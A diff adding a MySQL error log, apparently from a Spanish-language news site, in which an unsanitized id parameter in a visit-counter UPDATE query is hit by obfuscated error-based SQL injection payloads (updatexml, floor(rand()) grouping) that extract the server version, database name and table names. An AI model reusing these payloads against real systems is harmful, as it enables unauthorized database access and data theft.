@@ -1,0 +1,39 @@
+Time : 20:07:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 19:56:39
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 19:30:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 10:44:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 10:35:09
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!opinion?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/tAbLe_NaMe,0x3f7e21))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 /**//**/lImIt 1,1)),0)
+
+Time : 10:35:08
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!noticias?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/dIsTiNcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/tAbLe_NaMe,0x3f7e21))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264 /**//**/lImIt 0,1)),0)
+
+Time : 10:35:08
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '?~!2?~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**//**/sElEcT 1 /**//**/fRoM(/**//**/sElEcT count(*),/**//**/cOnCaT((/**//**/sElEcT(/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,count(0),0x3f7e21))) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/wHeRe /**//**/tAbLe_ScHeMa=0x64656c6264)) /**//**/fRoM information_schema./**//**/tAbLeS /**//**/lImIt 0,1),floor(rand(0)*2))x /**//**/fRoM information_schema./**//**/tAbLeS /**//**/gRoUp/**/By x)a)
+
+Time : 10:34:48
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!delbd?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/dAtAbAsE(),0x3f7e21)))),0)
+
+Time : 10:34:47
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!5.6.34-log?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,/**//**/vErSiOn(),0x3f7e21)))),0)
+
+Time : 10:22:38
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
